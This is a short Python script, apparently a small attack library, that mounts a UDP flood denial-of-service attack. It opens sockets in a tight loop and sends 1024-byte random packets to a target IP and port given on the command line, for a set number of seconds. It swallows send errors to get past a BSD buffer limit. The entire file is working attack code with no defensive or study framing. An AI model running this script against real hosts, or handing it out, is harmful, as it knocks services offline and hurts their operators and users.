import socket
import sys
import time
import random

# Mounts a UDP flood DOS attack on specified target for a specified time
def udp_flood(target_ip, port, t):
	
	begin = time.time()
	count = 0
	message = random._urandom(1024)


	# Loop to send packets
	while True:

		end = time.time()

		# Check for end time of attack
		if end - begin > t:
			print("Sent %d UDP packets" % (count))
			exit()

		# Send UDP packet
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.sendto(message, (target_ip, port))
			count = count + 1
		except:
			pass

		#known bug on BSD systems: Buffer space runs out when mass sending UDP messages
		#UDP on BSD/OSX does not block or discard packet data when the buffer is full, thus an
		#OS error occurs and throws an error and terminates program execution

		#Solved by using a try excepy block to filter the bug out


# Main for testing individual library function
if __name__ == "__main__":
	if len(sys.argv) != 4:
		print("Usage: %s <Target IP> <Port> <Time (s)>" % (sys.argv[0]))
		exit()

	udp_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
